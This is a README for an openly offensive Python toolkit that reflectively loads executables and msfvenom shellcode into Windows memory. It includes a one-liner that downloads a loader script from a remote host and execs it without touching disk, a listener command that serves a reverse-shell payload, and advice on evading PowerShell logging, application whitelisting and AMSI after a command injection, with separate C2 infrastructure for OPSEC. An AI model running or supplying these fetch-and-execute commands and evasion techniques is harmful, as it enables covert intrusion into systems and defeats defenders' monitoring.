# windows_reflective_loader
Python based reflective loader for Windows

These are python based tools for relective loading on Windows systems.

winloader.py - reaches out to send.py via -i <IP> and -p <port> to pull exe binary to reflectively load. Ideally you would host winloader on a cloud based web server, then host send.py with payload on another cloud based system on different IP range/subnet, and have your C2 callback on a third cloud based IP to keep everything separate. You access controls to limit access to pull winloader.py and only run send.py when needed to send. You can pull and execute winloader.py in memory to avoid writing to disk using a oneliner similar to:
```python -c "import urllib.request, sys; sys.argv = ['winloader.py', '-i', '172.26.130.102', '-p', '4444']; exec(urllib.request.urlopen('http://172.26.130.102:80/winloader.py').read())"```
This would be useful in a scenario where a target system has python and you can exploit something like command injection to then run the python command. This would let you avoid the PowerShell logs of doing it in PowerShell and potentiall bypass application whitelisting and AMSI.

send.py - reads in the exe and waits to recieve connection to the specified port and IP and then send the exe. It is ran with a command similar to:
```python3 send.py -i 0.0.0.0 -p 4444 -f ./rvsh.exe```
This listens on all assigned IPs. for better OPSEC you would specifiy the specific IP if there are multiple interfaces and IPs.

<img width="980" height="509" alt="image" src="https://github.com/user-attachments/assets/3ff7be13-c34f-4eb3-b5eb-1ce7892809f2" />

<img width="893" height="508" alt="image" src="https://github.com/user-attachments/assets/681395fe-2425-4595-b421-6cb5fba2ad4e" />

<img width="894" height="511" alt="image" src="https://github.com/user-attachments/assets/104c6808-e1d9-4c32-85a5-a344859f91ce" />

<img width="895" height="511" alt="image" src="https://github.com/user-attachments/assets/22ea3d8d-87f7-4cf8-a965-a9c51d318bd1" />

shellcodeloader.py - similar to winloader.py but uses shellcode bytestring instead of an exe.

shellcodesend.py - similar to send.py but reads in a txt file of shellcode generated with msfvenom in python format.

<img width="979" height="505" alt="image" src="https://github.com/user-attachments/assets/a9f9d34a-2120-4982-991c-fe78b7d517e0" />

<img width="893" height="511" alt="image" src="https://github.com/user-attachments/assets/d7013026-373c-4f44-afb1-0afe2b36defa" />

<img width="896" height="511" alt="image" src="https://github.com/user-attachments/assets/23d298c6-3b77-4c76-a223-3cb4f6b748ab" />

<img width="899" height="513" alt="image" src="https://github.com/user-attachments/assets/32ac2d71-ab0c-4999-a326-a3e6c2c6aa8f" />

runner.py - a simple shellcode runner using ctypes. If you have access to system and don't care about writing to disk you can use this runner to phone home to your C2.

<img width="977" height="511" alt="image" src="https://github.com/user-attachments/assets/bfd14b28-97f8-46f8-bb0e-bebe97e981bf" />

<img width="904" height="517" alt="image" src="https://github.com/user-attachments/assets/0060df06-c15c-41d2-8526-478e257a3e3c" />

<img width="895" height="516" alt="image" src="https://github.com/user-attachments/assets/e7f7d7cb-c7d0-4713-a23e-23afd726f6d6" />
